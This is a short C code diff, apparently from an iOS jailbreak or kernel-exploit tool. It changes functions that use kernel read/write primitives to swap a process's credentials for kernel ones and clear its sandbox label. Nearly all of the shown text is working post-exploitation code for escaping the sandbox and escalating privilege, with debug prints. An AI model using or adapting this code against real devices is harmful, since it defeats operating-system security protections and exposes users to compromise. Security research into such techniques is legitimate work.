@@ -43,7 +43,7 @@ uint64_t unsandbox(pid_t pid) {
     printf("[*] Unsandboxing pid %d\n", pid);
     
     uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
-    uint64_t ucred = get_ucred(proc); // pid credentials
+    uint64_t ucred =  borrow_ucreds(getpid(), 1); // pid credentials
     uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
     uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
     
@@ -56,7 +56,8 @@ uint64_t unsandbox(pid_t pid) {
     return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
 }
 
-void run_unsandboxed(void (^block)(void), pid_t pid) {
+uint64_t run_unsandboxed(void) {
+    pid_t pid = getpid();
     uint64_t proc = proc_of_pid(pid);
     uint64_t self_ro = kread64(proc + 0x20);
     printf("[DEBUG] self ro: 0x%llx\n", self_ro);
@@ -72,8 +73,9 @@ void run_unsandboxed(void (^block)(void), pid_t pid) {
     proc_set_ucred += get_kslide(); //proc_set_ucred
     printf("[DEBUG] Kernel set_ucred: 0x%llx\n", proc_set_ucred); //func:
     kwrite64(proc, kern_ucred);
-    block();
+    uint64_t ret = unsandbox(pid);
     kwrite64(proc, self_ucred);
+    return ret;
 }
 
 BOOL sandbox(pid_t pid, uint64_t sb) {
